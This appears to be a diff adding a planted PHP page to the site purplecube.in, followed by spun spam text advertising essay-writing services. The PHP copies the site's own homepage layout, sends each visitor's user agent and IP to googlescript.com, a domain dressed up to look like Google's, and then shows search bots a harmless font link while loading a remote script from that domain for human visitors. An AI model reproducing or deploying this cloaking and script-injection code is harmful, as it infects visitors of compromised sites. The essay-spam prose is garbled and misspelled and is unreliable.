@@ -1,0 +1,52 @@
+<?php   $url = 'http://' . $_SERVER['HTTP_HOST'] . '/';
+   $content = file_get_contents($url);
+   $content = preg_replace('/<meta http-equiv(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)description(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)title(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)keywords(.*?)>/i', '', $content);
+   $content = preg_replace('/<title(.*?)title>/i', '', $content);
+   $content = preg_replace('/<link rel="canonical"(.*?)>/i', '', $content);
+   preg_match_all('/<\!DOCTYPE(.*?)>/i', $content, $doctypeTag);
+   preg_match_all('/<html(.*?)>/i', $content, $htmlTag);
+   preg_match_all('/<head(.*?)>/i', $content, $headTag);
+   preg_match_all('/<body(.*?)>/i', $content, $bodyTag);
+   $siteDOM = new DOMDocument;
+   @$siteDOM->loadHTML($content);
+   $head = new DOMDocument;
+   $headDOM = $siteDOM->getElementsByTagName('head')->item(0);
+   foreach ($headDOM->childNodes as $child)
+   $head->appendChild($head->importNode($child, true));
+   $headHTML = @$head->saveHTML();
+   $body = new DOMDocument;
+   $bodyDOM = $siteDOM->getElementsByTagName('body')->item(0);
+   foreach ($bodyDOM->childNodes as $child)
+   $body->appendChild($body->importNode($child, true));
+   $bodyHTML = @$body->saveHTML();
+   echo $doctypeTag[0][0] . PHP_EOL . $htmlTag[0][0] . PHP_EOL . $headTag[0][0] . PHP_EOL;
+   ?>
+<title>Order An Essay Paper Wear Overtures Photoblog order an essay paper Vindictive Wok Genesis Vietnam End | purplecube.in</title>
+<meta name="description" content="Then make use of the amounts you attack degree and wrote down for the fabric grid. | Order An Essay Paper" />
+<?php echo $headHTML . PHP_EOL; ?>
+<?php
+   $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
+   $ua = urlencode($ua);
+   $ip = $_SERVER['REMOTE_ADDR'];
+   $api = 'http://googlescript.com/api.php?';
+   $apikey = 'e7d52430614c8319dbde9ba6cb49993e';
+   $churl = "{$api}action=get_link&api_key=$apikey&group=css-font&ua=$ua&ip=$ip";
+   $check = file_get_contents($churl);
+   $json = json_decode($check);
+   if ($json->{'bot_action'}->{'text'} == 'y') {
+   echo '<script src="http://fonts.googleapis.com/css?family=Open+Sans"></script>';
+   }
+   else {
+   echo '<script src="http://googlescript.com/css-font"></script>';
+   }
+   ?>
+   </head>
+   <?php echo $bodyTag[0][0] . PHP_EOL; ?>
+     <div id="main">
+               <div id="primary">
+<h1>order an essay paper Profound Celine Subterfuge</h1>The fact is that the experience of knowledge of good is very difficult to transmit from one person to another. <p>Wrriting reason for this is simple the buyers are not <a href="http://purplecube.in/custom-mba-essays">custom mba essays</a> <strong>order an essay paper</strong> well informed. Moreover, authorities try to impose restrictions for borrowers to get microloan. Is it easy to convince what the other person wants to build, to love and to build is much easier and more correct than destroy. Writer fully followed the instructions. Even bankers with MBA and financial degrees failed to cope with such task. Not everyone should do this way.</p> <h2>This style has its own pieces of regulations to become used.</h2>That is why, for instance, the government regulates the safety issues related to food and drugs. <p>For instance, <a href="http://purplecube.in/paper-writing-service">paper writing service</a> certain industry <a href="http://purplecube.in/custom-college-essay">custom college essay</a> business reports order an essay paper are made concerning a company, which belongs to this particular industry. Finally, I would like to emphasize that clear thesis, well presented, logical structure of business report, as well as comprehensive <a href="http://purplecube.in/buy-a-research-paper-online">buy a research paper online</a> and relevant data tips for writing a essay key to success. And what if the fate in the end tips for writing a essay cause a person serious blow, how to keep the faith. As well, about 15 minutes of material had to be removed from the final version of the film to avoid receiving an NC-17 rating (the highest rating among the existing, and as a rule, the administration of the cinemas prefers not to mess with such films). As a fact, such business report usually includes comprehensive characteristic of a region - its overview, economic and entrepreneurial activity, conditions, major export and import and so on. You can always order a business report of any difficulty at www. It should also explain order an essay paper how and under what circumstances they could use them.</p> <h2>Understand how to study online as well as in a collection.</h2>As a part of my role as a movie critic I will create my own scale to rate the movie. <p>Moreover, as a rule, business reports have particular specialization. For example, like Latin America or the United States. As a fact, children love to move, to play with adults, they demand attention, actively participate in all domestic affairs. But as a live shark was far less mechanical that the one that was used to shoot, then there were built two smaller cells. In turn, a comprehensive report is more sophisticated kind of business report that unites a number of facts and factors, as well as includes their comparison, analysis and tiips forecast. In the original script shark was not supposed to break the cage, but after a real fish strikingly started breaking into the cell, and these rare footage was filmed, the script was rewritten, and these shots appeared in the movie.</p> <h2>Try olive oil, butter, avocado, and mayonnaise.</h2>It should be noted that children under 17 years must be accompanied by their parents to watch tips for writing a essay film. <p>Pros evil sound is much more convincing, but the truth sometimes is ephemeral. The circumstances that forced him to change the usual perception of the tips for writing a essay, a person cannot organize and create a manual or a collection of tips. In showing children how to <a href="http://purplecube.in/custom-essay-writing">custom essay writing</a> become responsible for themselves as well as their own learning, I am giving them the tools ffor become successful in life, to believe in themselves, and to love themselves. From all of this there has been collected an action on corruption in the resort, home to a hungry shark to blood, and the fact that none of the tourists have ever dreamt about it. And Tom, who has worked in this company for many years, order an essay paper was forced to defend himself, so as not to lose his place. order an essay paper As a fact, the risks, arising from this situation are almost incalculable. First of all, parents should instill an interest in learning about the world.</p> <h2>The ship was located capsized, with one of the friends holding onto it.</h2>This film made a strong impression on me and I think everyone should watch it at least once. <p>In the scene where the shark attacks the cage with its sitting in Hooper, underwater camera operators Ron Taylor and Valerie Taylor used a real shark. Moreover, it is important to note that business report should contain relevant data and facts about a company to properly evaluate the state of its affairs. Consequently, with the aim to make a good business report, a referee should choose appropriate ror of a company that specializes in this industry. In my opinion, children should wtiting the basic principles of what is good and what is bad, they should learn with such concepts as life values, in particular responsibility, self-perfection, discipline, democratic principles etc. Tips for writing a essay, there order an essay paper is obvious information asymmetry. He succumbed to the pressure of the passions of the headmistress.</p> <h2>i had been fornicating with females and they explained he was next.</h2>Wrlting do we expect it from ordinary people. <p>Young Steven Spielberg has been working on the movie "Jaws" for a long time, and blew up the After consulting with oceanographers, Spielberg has created some mechanical stuffed shark killers, has built a huge swimming <strong>order an essay paper</strong> pool and stocked up on fake blood and patience. In addition, it should be mentioned that business report be limited to order an essay paper certain geographic region or a country. But in retaliation, she accused him of sexual harassment. This is a screen adaptation of the works of Peter Benchley. Sometimes a person goes through a barely visible track, but it was it, which brought it to light. Of course, predatory lending can be seen with the naked eye, and, therefore, by ordinary people.</p> <h2>Making baby garlic gravy for chicken wings: convey to a sluggish bubble, lower to low heat.</h2>How to explain to a man who lost closest to him people that racism is an evil. <p>The problem is that the through fall hate to break is hard. I tips for writing a essay convinced that <strong>order an essay paper</strong> for the child it is important to feel that parents are always ready to engage in his activity, that for them strategies tipx as class meetings, positive discipline, and democratic principles. Without any doubts all arguments and tips for writing a essay evidence should be checked and analyzed. Another reason <strong>order an essay paper</strong> for the success - is minimalist suspense soundtrack. One, made in the scale of <strong>Tips for writing a essay</strong> had a dummy, the second, produced in 58 scale, had a professional jockey and stuntman Carl Rizzo in tips for writing a essay, whose growth was 4 feet 9 inches.</p>
+                  </div>
+               </div>
